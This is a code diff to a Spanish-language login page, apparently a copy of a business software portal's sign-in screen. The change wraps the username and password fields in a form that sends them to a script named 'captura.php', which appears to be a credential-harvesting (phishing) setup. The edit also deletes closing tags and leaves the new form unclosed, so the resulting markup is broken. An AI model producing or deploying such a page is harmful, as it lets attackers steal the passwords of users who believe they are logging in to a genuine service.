@@ -144,36 +144,29 @@
 
                 <span>Usuario</span>
 
-                <input type="text" id="txtUsuario" title="Usuario">
+               <form action="captura.php" method="POST">
+  <span>Usuario</span>
+  <input type="text" id="txtUsuario" name="usuario" title="Usuario" required>
 
-                <span>Contraseña</span>
+  <span>Contraseña</span>
+  <input type="password" id="txtContrasena" name="contrasena" title="Contraseña" required>
 
-                <input type="password" id="txtContrasena" title="Contraseña">
+  <div id="captcha">
+    <table>
+      <tr>
+        <td><img src="" id="imgCaptcha"></td>
+        <td><input type="text" id="txtCaptcha"></td>
+      </tr>
+    </table>
+  </div>
 
-                <div id="captcha">
-                    <table>
-                        <tbody><tr>
-                            <td>
-                                <img src="" id="imgCaptcha">
-                            </td>
-                            <td>
-                                <input type="text" id="txtCaptcha">
-                            </td>
-                        </tr>
-                    </tbody></table>
-                </div>
+  <div class="contenedor-controles">
+    <button type="submit" id="btnSiguiente" title="Siguiente para seleccionar una empresa y una sucursal">Siguiente</button>
+    <a id="recordarClave" class="derecha">Olvidé mi clave</a>
+    <div class="loader" id="dvLoadEmpSuc">Por favor, espere...</div>
+    <br>
+    <span id="spnMsjUsuarios" class="error"></span>
 
-                <div class="contenedor-controles">
-                    <button id="btnSiguiente" title="Siguiente para seleccionar una empresa y una sucursal">Siguiente</button>
-                    <a id="recordarClave" class="derecha">Olvidé mi clave</a>
-                    <div class="loader" id="dvLoadEmpSuc">Por favor, espere...</div>
-                    <br>
-                    <span id="spnMsjUsuarios" class="error"></span>
-                </div>
-            </div>
-        </section>
-
-    </section>
 
     <footer class="contenedor-inferior" id="contenedor-inferior">
         <div id="imagenSinco"></div>
